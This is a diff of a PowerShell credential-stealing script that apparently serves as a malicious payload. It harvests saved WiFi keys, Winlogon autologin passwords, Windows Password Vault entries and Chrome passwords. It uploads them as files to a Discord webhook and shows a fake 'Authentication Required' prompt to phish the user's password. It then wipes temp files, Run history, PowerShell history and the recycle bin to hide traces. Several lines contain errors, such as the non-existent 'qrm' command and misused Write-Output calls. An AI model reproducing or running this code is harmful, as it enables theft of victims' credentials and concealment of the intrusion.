@@ -9,50 +9,54 @@ function Send-DiscordWebhook {
     param (
         [string]$WebhookUrl,
         [string]$Source,
-        [string]$Message
+        [parameter(Mandatory=$false)]
+        [string]$Message,
+        [parameter(Mandatory=$false)]
+        [string]$File
     )
 
-    # Create a hashtable for the body
-    $body = @{
-        content = "Source" + $Source + "\r\n" + "Value: " + $Message
-    } | ConvertTo-Json
+    if(-not ([string]::IsNullOrEmpty($Message))) {
+        # Create a hashtable for the body
+        $body = @{
+            content = "Source: " + $Source + "," + "Value: " + $Message
+        } | ConvertTo-Json
 
-    # Set headers for the HTTP request
-    $headers = @{
-        "Content-Type" = "application/json"
+        # Set headers for the HTTP request
+        $headers = @{
+            "Content-Type" = "application/json"
+        }
+
+        # Send the POST request to the Discord webhook
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -Headers $headers
     }
-
-    # Send the POST request to the Discord webhook
-    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -Headers $headers
+    if(-not ([string]::IsNullOrEmpty($File))) {
+        curl.exe -F "file1=@$file" $WebhookUrl
+    }
 }
 
 # First, grab all the WiFi Password
-
+$FileNameWifi = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFiPasswords.txt"
 $wifiprofiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
-if (-not ($wifiprofiles::IsNullOrEmpty)) {
-    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Wifi" -Message $wifiprofiles
-}
+$wifiprofiles >> $env:TMP\$FileNameWifi
+Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Wifi" -File $wifiprofiles
 
 # Autologin password
-
-$AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
+$FileNameAutoLogin = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_AutoLogin.txt"
+Write-Output Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword" >> $env:TMP\$FileNameAutoLogin
 If (($AutoLoginPassword).DefaultPassword) {
-    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "AutoLogin" -Message $AutoLoginPassword
+    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "AutoLogin" -File $env:TMP\$FileNameAutoLogin
 } 
 
 # Windows Password Vault
 
-$VaultPassword = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
-If (-not ($VaultPassword::IsNullOrEmpty)) {
-    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Vault" -Message $VaultPassword
-}
+$FileNameVault = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_PassVault.txt"
+Write-Output [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } >> $env:TMP\$FileNameVault
+Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Vault" -File $env:TMP\$FileNameVault
 
 # Chrome Password
-
-$ChromePassword = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
-If (-not ($ChromePassword::IsNullOrEmpty)) {
-    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "ChromeVault" -Message $ChromePassword
-}
+$FileNameChrome = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_ChromePasswords.txt"
+Write-Output [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)) >> $env:TMP\$FileNameChrome
+Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "ChromeVault" -File $env:TMP\$FileNameChrome
 
 # Now that we send everything, do a nice prompt to the user to submit their password anyway :)
  
@@ -126,15 +130,21 @@ $msgTitle = "Authentication Required"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-Write-Host "The user clicked: $Result"
 
+$FileNameCreds = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 $creds = Get-Creds
+Write-Output $creds >> $env:TMP\$FileNameCreds
 
-if (-not ($creds::IsNullOrEmpty)) {
-    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "PasswordPrompt" -Message $creds
+if (-not ([string]::IsNullOrEmpty($creds))) {
+    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "PasswordPrompt" -File $env:TMP\$FileNameCreds
 }
 
+# Clear Evidence
 
+qrm $env:TMP\* -r -Force -ErrorAction SilentlyContinue
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 
 
